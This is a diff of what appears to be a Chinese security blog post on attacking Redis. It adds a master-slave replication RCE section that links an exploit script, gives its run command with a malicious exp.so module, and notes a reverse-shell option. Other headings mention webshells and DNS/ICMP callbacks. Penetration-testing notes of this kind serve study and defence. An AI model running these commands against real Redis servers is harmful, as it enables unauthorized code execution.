@@ -67,7 +67,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.1k字</span>
+            <span class="post-count">1.2k字</span>
         </span>
     </span>
 
@@ -147,7 +147,14 @@
 <p><img src="/img/redis/webshell01.png" alt=""></p>
 <p>执行一条命令：</p>
 <p><img src="/img/redis/webshell02.png" alt=""></p>
-<h2 id="主从复制获取shell"><a href="#主从复制获取shell" class="headerlink" title="主从复制获取shell"></a>主从复制获取shell</h2><p>未复现</p>
+<h2 id="主从复制获取shell"><a href="#主从复制获取shell" class="headerlink" title="主从复制获取shell"></a>主从复制获取shell</h2><p>利用脚本：<a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></p>
+<p>执行以下命令：</p>
+<p><code>python3 redis_rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp.so -a 被攻击redis的登录密码</code> </p>
+<p><img src="/img/redis/zcfz01.png" alt=""></p>
+<p><img src="/img/redis/zcfz02.png" alt=""></p>
+<p>如果选择 <code>r</code> ，即反弹shell</p>
+<p><img src="/img/redis/zcfz03.png" alt=""></p>
+<p><img src="/img/redis/zcfz04.png" alt=""></p>
 <h2 id="执行lua脚本"><a href="#执行lua脚本" class="headerlink" title="执行lua脚本"></a>执行lua脚本</h2><p>搞不懂意义何在</p>
 <h2 id="写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）"><a href="#写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）" class="headerlink" title="写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）"></a>写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</h2><blockquote>
 <p>不太清楚写入二进制文件之后的操作</p>
